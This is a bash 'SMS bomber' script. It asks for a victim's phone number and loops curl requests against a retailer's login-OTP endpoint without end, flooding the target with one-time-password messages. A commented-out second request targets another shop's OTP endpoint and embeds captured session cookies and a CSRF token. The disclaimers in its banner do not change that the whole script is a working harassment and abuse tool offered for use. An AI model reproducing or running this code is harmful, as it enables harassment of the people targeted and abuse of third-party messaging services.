#it you use this code then please give me the credits
#AUTHOR DANISH SHEIKH	
menu(){

clear

printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[93mAuthor Danish sheikh  \e[0m\n"
printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[93mPlease press ctrl+c to stop the bomber otherwize it will not stop \e[0m\n"
printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[93mDont use it for troubling peoples \e[0m\n"
printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[93mAUTHOR IS NOT RESPONSIBLE FOR MISSUSE OF THIS TOOL\e[0m\n"

printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[93m BEST TOOL FOR MASSIVE BOMBING within 50 LINES OF code \e[0m\n"
printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[93mDont use +91 type your number directly\e[0m\n"

printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER VICITM NUMBER >>> \e[0m\n"
read -p '---------------> ' num
printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER LOG FILE NAME >>> \e[0m\n"
read -p '---------------> ' log

printf "\n"
printf ">>>\e[1;92m ATTACKING START ON +91$num \e[0m<<<"
sleep 5
printf "\n"
printf "PRESS CLTR+C TO QUIT ............. \n"
sleep 3
clear
opr

}

opr(){

while true
do
#curl -i -s -k -X $'POST' \
#    -H $'Host: www.fbbonline.in' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://www.fbbonline.in/customer/account/create' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 436' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: _gcl_au=1.1.243953279.1596480303; __stp={\"visit\":\"returning\",\"uuid\":\"de2960e2-2dcc-4dfc-8afb-edce8db26f38\"}; _fv=cmpnpp; __stdf=0; __stgeo=\"1\"; __stbpnenable=1; historyPlpPage=0; PHPSESSID=u1c4phs0iqtfsl6b8nhh8n9r97; _st_time=1598178565; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; all_store_details=null' \
#    -b $'_gcl_au=1.1.243953279.1596480303; __stp={\"visit\":\"returning\",\"uuid\":\"de2960e2-2dcc-4dfc-8afb-edce8db26f38\"}; _fv=cmpnpp; __stdf=0; __stgeo=\"1\"; __stbpnenable=1; historyPlpPage=0; PHPSESSID=u1c4phs0iqtfsl6b8nhh8n9r97; _st_time=1598178565; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; all_store_details=null' \
#    --data-binary $'YII_CSRF_TOKEN=bbbef391f437ca8b30e4f2e45e998ccc9ea911e5&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D='$num'&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=sjbsj%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=malicious&RegistrationForm%5Blast_name%5D=virus&RegistrationForm%5Bpassword%5D=httpsindianvirus&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=' \
#    $'https://www.fbbonline.in/customer/account/GenerateOtp' > $log.txt
curl -i -s -k -X $'GET' \
    -H $'Host: express.shop.bigbazaar.com' -H $'Connection: close' -H $'sec-ch-ua: \";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"' -H $'Accept: application/json, text/plain, */*' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36' -H $'Origin: https://shop.bigbazaar.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://shop.bigbazaar.com/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' \
    $'https://express.shop.bigbazaar.com/express/customer/'$num'/loginOtpInitiate' > $log.txt

done

}


menux() {

clear
apt install curl
clear
printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[93mAuthor Danish sheikh >>> \e[0m\n"
printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[93mAUTHOR IS NOT RESPONSIBLE FOR MISSUSE OF THIS TOOL\e[0m\n"
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;93m ATTACK ON NUMBER \e[0m\n"
printf "\n"
read -p '>>> SELECT ANYONE >>> ' options

if [ "$options" -eq "1" ];then
        menu
fi

}

menux
